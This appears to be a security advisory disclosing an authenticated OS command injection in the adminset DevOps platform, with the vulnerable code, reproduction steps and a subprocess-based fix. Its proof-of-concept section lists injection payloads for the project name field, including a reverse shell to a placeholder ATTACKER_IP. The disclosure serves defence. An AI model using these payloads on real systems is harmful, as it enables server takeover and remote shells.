# OS Command Injection in adminset

## Summary

A critical OS Command Injection vulnerability exists in **adminset** (DevOps Automation Platform) that allows authenticated users to execute arbitrary commands on the server.

- **Vendor**: guohongze
- **Product**: adminset
- **Affected Version**: <= latest (commit as of 2026-10-27)
- **Vulnerability Type**: CWE-78 (OS Command Injection)
- **CVSS v3.1 Score**: 8.8 (High)
- **Attack Vector**: Network
- **Authentication Required**: Yes (authenticated user)

## Vulnerability Details

The `Project.name` field from user input is passed directly to `os.system()` without any sanitization or validation in `delivery/deli.py`:

**Vulnerable Code** (`delivery/deli.py`, lines 106-107):
```python
job_name = project.job_name.name  # User-controlled input from Project model
# ...
os.system("mkdir -p /var/opt/adminset/workspace/{0}/logs".format(job_name))
os.system("mkdir -p /var/opt/adminset/workspace/{0}/scripts".format(job_name))
```

The `Project.name` field in `appconf/models.py` is a simple `CharField` with no input validation:
```python
name = models.CharField("Project Name", max_length=50, unique=True, null=False, blank=False)
```

The form in `appconf/forms.py` also lacks any validation:
```python
'name': TextInput(attrs={'class': 'form-control','style': 'width:450px;'}),
```

## Impact

An authenticated attacker can inject shell commands via the project name field, leading to:
- Remote Code Execution (RCE) on the server
- Full system compromise
- Data exfiltration
- Lateral movement in infrastructure

## Proof of Concept

### Payload Examples

1. **Command execution via semicolon**:
   ```
   Project Name: test;id
   ```
   Result: Creates directory AND executes `id` command

2. **Command substitution**:
   ```
   Project Name: test$(whoami)
   ```
   Result: Executes `whoami` and uses output in path

3. **Reverse shell**:
   ```
   Project Name: test;bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1;
   ```

### Reproduction Steps

1. Login to adminset as any authenticated user
2. Navigate to Project creation (appconf)
3. Create a new project with malicious name: `testproject;id>/tmp/pwned`
4. Create a Delivery associated with this project
5. Execute the delivery
6. Check `/tmp/pwned` for command output

## Remediation

Replace `os.system()` with safer alternatives and validate input:

```python
import shlex
import subprocess

# Validate project name (alphanumeric only)
if not re.match(r'^[a-zA-Z0-9_-]+$', job_name):
    raise ValueError("Invalid project name")

# Use subprocess with shell=False
workspace_logs = f"/var/opt/adminset/workspace/{job_name}/logs"
workspace_scripts = f"/var/opt/adminset/workspace/{job_name}/scripts"
subprocess.run(["mkdir", "-p", workspace_logs], check=True)
subprocess.run(["mkdir", "-p", workspace_scripts], check=True)
```

## Timeline

- **2026-10-27**: Vulnerability discovered
- **2026-10-27**: Vendor notified via GitHub issue
- **TBD**: Vendor response
- **TBD**: CVE assigned

## References

- [CWE-78: Improper Neutralization of Special Elements used in an OS Command](https://cwe.mitre.org/data/definitions/78.html)
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)

## Credits

- Discovered by: 0p5cur
- GitHub: https://github.com/0p5cur

## Disclaimer

This vulnerability disclosure is intended for educational and authorized security research purposes only. Use responsibly and only against systems you have permission to test.
